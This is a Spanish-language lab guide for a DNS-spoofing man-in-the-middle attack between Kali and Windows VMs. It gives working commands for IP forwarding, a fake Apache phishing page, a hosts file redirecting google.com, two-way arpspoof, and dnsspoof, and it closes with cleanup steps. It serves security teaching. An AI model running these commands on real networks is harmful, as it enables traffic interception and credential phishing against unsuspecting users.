# Práctica de Laboratorio: Envenenamiento de Caché DNS (DNS Spoofing)

**Objetivo:** Realizar un ataque de envenenamiento DNS para redirigir el tráfico de una máquina víctima a un servidor web controlado por el atacante. Este es un tipo de ataque "Man-in-the-Middle" (MitM).

**Máquinas Requeridas:**
*   Una VM con Kali Linux (atacante).
*   Una VM con Windows 8.1 (víctima) en la misma red NAT.

**Herramientas:**
*   `arpspoof` (para envenenar la caché ARP y ponernos en medio de la comunicación).
*   `dnsspoof` (para interceptar y falsear las respuestas DNS).
*   Un servidor web básico en Kali (Apache2).

---

## Parte 1: Preparación del Entorno del Atacante (Kali Linux)

### Paso 1: Habilitar el Reenvío de IP (IP Forwarding)

Para que la máquina víctima no pierda la conexión a internet mientras la atacamos, debemos reenviar los paquetes que interceptemos. De lo contrario, levantaríamos sospechas (sería un ataque de Denegación de Servicio).

```bash
# Habilita el reenvío de IP. El '1' lo activa.
sudo sysctl -w net.ipv4.ip_forward=1
```

### Paso 2: Preparar el Servidor Web Falso

Iniciaremos el servidor Apache2 y crearemos una página de phishing simple.

```bash
# Inicia el servicio de Apache2
sudo systemctl start apache2

# Crea una página web falsa. Este comando sobrescribe el index.html por defecto.
echo "<html><body><h1>Página de Phishing</h1><p>Has sido redirigido.</p></body></html>" | sudo tee /var/www/html/index.html
```

### Paso 3: Crear el Archivo de Hosts para Dnsspoof

`dnsspoof` necesita un archivo que le diga qué dominios envenenar y a qué IP redirigirlos. Crearemos un archivo que redirija `www.google.com` a la IP de nuestra máquina Kali.

1.  **Averigua tu propia IP en Kali:**
    ```bash
    ip addr show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
    ```
    > Apunta tu IP. Para el ejemplo, usaremos `[IP_DE_KALI]`.

2.  **Crea el archivo `hosts.txt`:**
    ```bash
    # Reemplaza [IP_DE_KALI] por tu IP real
    echo "[IP_DE_KALI] *.google.com" > hosts.txt
    echo "[IP_DE_KALI] google.com" >> hosts.txt
    ```

---

## Parte 2: Ejecución del Ataque

Para este ataque, necesitarás 3 terminales de Kali distintas.

### Paso 1: Obtener IPs de la Víctima y del Gateway

*   **IP Víctima (Windows 8.1):** Ya deberías conocerla de laboratorios anteriores. Si no, usa `nmap`. La llamaremos `[IP_VICTIMA]`.
*   **IP del Gateway (Puerta de enlace):** Es la IP de tu router o de la interfaz NAT de Virt-Manager. Puedes encontrarla en Windows con `ipconfig` o en Kali con `ip route | grep default`.
    ```bash
    # Ejemplo de cómo encontrar el gateway en Kali
    ip route | grep default
    ```
    > La llamaremos `[IP_GATEWAY]`.

### Terminal 1: Envenenamiento ARP (ARP Spoofing)

Vamos a decirle a la víctima que nosotros somos el router, y al router que nosotros somos la víctima. Esto nos pone en medio de la comunicación.

```bash
# Engañar a la víctima para que piense que somos el gateway
sudo arpspoof -i eth0 -t [IP_VICTIMA] [IP_GATEWAY]
```

### Terminal 2: Envenenamiento ARP (ARP Spoofing) - Dirección Inversa

```bash
# Engañar al gateway para que piense que somos la víctima
sudo arpspoof -i eth0 -t [IP_GATEWAY] [IP_VICTIMA]
```

### Terminal 3: Envenenamiento DNS (DNS Spoofing)

Ahora que el tráfico pasa por nosotros, interceptamos las peticiones DNS y respondemos con nuestra IP falsa para los dominios que especificamos en `hosts.txt`.

```bash
# Ejecuta dnsspoof con nuestro archivo de hosts
sudo dnsspoof -i eth0 -f ./hosts.txt
```

---

## Parte 3: Verificación en la Máquina Víctima (Windows 8.1)

1.  Abre un navegador web en la máquina Windows.
2.  Intenta navegar a `http://www.google.com` (es importante usar `http` y no `https` para este lab, ya que `https` (HSTS) puede prevenir el ataque en navegadores modernos).
3.  **Resultado:** En lugar de ver la página real de Google, deberías ver la "Página de Phishing" que creaste en tu servidor Apache.

### Limpieza

Cuando termines, detén los tres comandos en las terminales de Kali (con `Ctrl+C`) y desactiva el reenvío de IP para devolver la red a su estado normal.

```bash
sudo sysctl -w net.ipv4.ip_forward=0
sudo systemctl stop apache2
```

¡Felicidades! Has interceptado tráfico de red y has suplantado un registro DNS para redirigir a una víctima.